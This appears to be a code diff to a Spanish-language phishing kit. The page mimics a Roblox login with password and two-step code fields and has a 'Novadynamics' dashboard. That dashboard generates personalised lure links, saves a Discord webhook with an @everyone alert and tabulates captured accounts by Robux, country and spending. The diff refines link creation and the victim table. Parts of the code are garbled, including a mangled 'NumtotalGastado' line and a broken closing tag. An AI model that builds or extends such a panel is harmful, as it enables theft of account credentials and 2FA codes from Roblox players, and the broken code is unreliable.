@@ -64,7 +64,7 @@
 <body>
 
 <div class="pagina-login" id="pagLogin">
-    <a href="#" class="cerrar-login" onclick="cerrarLogin()">&times;</a>
+    <a href="#" class="cerrar-login" onclick="cerrarLogin();return false">&times;</a>
     <div class="login-contenedor">
         <div class="login-logo"><span>ROBLOX</span></div>
         <h2 class="login-titulo">Iniciar sesión</h2>
@@ -75,13 +75,13 @@
             <input type="password" class="login-input" id="passLogin" placeholder="Contraseña">
             <div class="mensaje-error" id="errorPass">❌ Contraseña incorrecta</div>
             <div class="cargando" id="cargandoDatos">🔄 Verificando cuenta...</div>
-            <button class="login-boton" onclick="verificarLogin()">Iniciar sesión</button>
+            <button class="login-boton" onclick="verificarLogin();return false">Iniciar sesión</button>
         </div>
         <div class="codigo-2fa" id="formulario2fa">
             <label class="login-label">Código de verificación en dos pasos</label>
             <input type="text" class="login-input" id="codigo2fa" placeholder="Ingresa los 6 dígitos" maxlength="6">
             <div class="mensaje-error" id="errorCodigo">❌ Código incorrecto. Inténtalo de nuevo.</div>
-            <button class="login-boton" onclick="verificarCodigo()">Verificar</button>
+            <button class="login-boton" onclick="verificarCodigo();return false">Verificar</button>
         </div>
     </div>
 </div>
@@ -90,9 +90,9 @@
     <aside class="sidebar">
         <div class="logo"><span>N</span>ovadynamics</div>
         <nav>
-            <button class="btn activo" onclick="irPag('inicio')">🏠 Inicio</button>
-            <button class="btn" onclick="irPag('enlaces')">🔗 Generar Enlace</button>
-            <button class="btn" onclick="irPag('cuentas')">📋 Historial</button>
+            <button class="btn activo" onclick="irPag('inicio');return false">🏠 Inicio</button>
+            <button class="btn" onclick="irPag('enlaces');return false">🔗 Generar Enlace</button>
+            <button class="btn" onclick="irPag('cuentas');return false">📋 Historial</button>
         </nav>
     </aside>
     <main class="main">
@@ -108,24 +108,24 @@
         <div class="pagina" id="pagEnlaces">
             <h2 style="margin-bottom:20px;font-size:18px">Generador de Enlaces</h2>
             <div class="tabs">
-                <span class="tab activa" onclick="irTab('crear')">🔗 Crear Enlace</span>
-                <span class="tab" onclick="irTab('config')">⚙️ Configuración</span>
+                <span class="tab activa" onclick="irTab('crear');return false">🔗 Crear Enlace</span>
+                <span class="tab" onclick="irTab('config');return false">⚙️ Configuración</span>
             </div>
             <div class="tab-cont activo" id="tabCrear">
                 <div class="panel">
                     <h3>Enlace Personalizado</h3>
-                    <input type="text" id="datoUsuario" placeholder="Nombre de usuario o ID de Roblox">
-                    <button onclick="crearEnlace()">Generar Enlace</button>
+                    <input type="text" id="datoUsuario" placeholder="Escribe un usuario o ID de Roblox">
+                    <button onclick="crearEnlace();return false">✅ Generar Enlace</button>
                     <div class="caja-link" id="enlaceGenerado"></div>
-                    <button class="sec" style="display:none;margin-top:8px" id="botonCopiar" onclick="copiarEnlace()">📋 Copiar Enlace</button>
+                    <button class="sec" style="display:none;margin-top:10px" id="botonCopiar" onclick="copiarEnlace();return false">📋 Copiar Enlace</button>
                 </div>
             </div>
             <div class="tab-cont" id="tabConfig">
                 <div class="panel">
                     <h3>Configuración del Sistema</h3>
                     <input type="text" id="urlWebhook" placeholder="Tu Webhook de Discord">
-                    <button onclick="guardarWebhook()">✅ Guardar</button>
-                    <button class="sec" onclick="borrarWebhook()">🗑️ Borrar</button>
+                    <button onclick="guardarWebhook();return false">✅ Guardar</button>
+                    <button class="sec" onclick="borrarWebhook();return false">🗑️ Borrar</button>
                     <div class="mensaje-error" id="estadoWebhook">⚠️ Sin configurar</div>
                     <div class="fila-sw">
                         <span>🔔 Activar @everyone</span>
@@ -183,17 +183,28 @@ function generarCodigosRespaldo(){
 }
 
 function crearEnlace(){
-    const id=document.getElementById('datoUsuario').value.trim()||'usuario';
+    const id=document.getElementById('datoUsuario').value.trim() || 'usuario';
     const baseURL = window.location.origin + window.location.pathname;
-    enlaceActual = baseURL + '?u=' + encodeURIComponent(id) + '&ref=novadynamics&v=2.2.0';
-    document.getElementById('enlaceGenerado').style.display='block';
-    document.getElementById('enlaceGenerado').textContent=enlaceActual;
-    document.getElementById('botonCopiar').style.display='block';
+    enlaceActual = baseURL + '?u=' + encodeURIComponent(id) + '&ref=novadynamics&v=3.0.0';
+    const caja = document.getElementById('enlaceGenerado');
+    const boton = document.getElementById('botonCopiar');
+    caja.style.display='block';
+    caja.textContent=enlaceActual;
+    boton.style.display='block';
+    alert('✅ Enlace generado:\n' + enlaceActual);
 }
 function copiarEnlace(){
     navigator.clipboard.writeText(enlaceActual)
-    .then(()=>alert('✅ Enlace copiado:\n'+enlaceActual))
-    .catch(()=>alert('⚠️ Copia manualmente el enlace'));
+    .then(()=>alert('✅ ¡Enlace copiado!'))
+    .catch(()=>{
+        const input=document.createElement('textarea');
+        input.value=enlaceActual;
+        document.body.appendChild(input);
+        input.select();
+        document.execCommand('copy');
+        document.body.removeChild(input);
+        alert('✅ ¡Enlace copiado!');
+    });
 }
 
 async function cargarDatosRoblox(usuario){
@@ -367,7 +378,7 @@ function actualizarTodo(){
     let totalRobux=0, totalGastado=0;
     registros.forEach(r=>{
         totalRobux += Number(r.robux)||0;
-        totalGastado += Number(r.robuxGastados)||0;
+        totalGastado += NumtotalGastado += Number(r.robuxGastados)||0;
     });
     document.getElementById('robuxSum').textContent=totalRobux.toLocaleString();
     document.getElementById('cuentasTot').textContent=registros.length;
@@ -375,7 +386,20 @@ function actualizarTodo(){
 
     const cuerpo=document.getElementById('cuerpoTabla');
     if(registros.length===0){
-        cuerpo.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>'
+        cuerpo.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>';
+        return;
+    }
+    cuerpo.innerHTML=registros.map((r,i)=>`
+        <tr>
+            <td>${r.usuario}</td>
+            <td>${r.robux}</td>
+            <td>${r.dias} días</td>
+            <td>${r.pais}</td>
+            <td style="font-size:12px;color:#888">${r.fecha.split(' ')[0]}</td>
+        </tr>
+    `).join('');
+}
 </script>
 </body>
-</html>
+</html
+    >
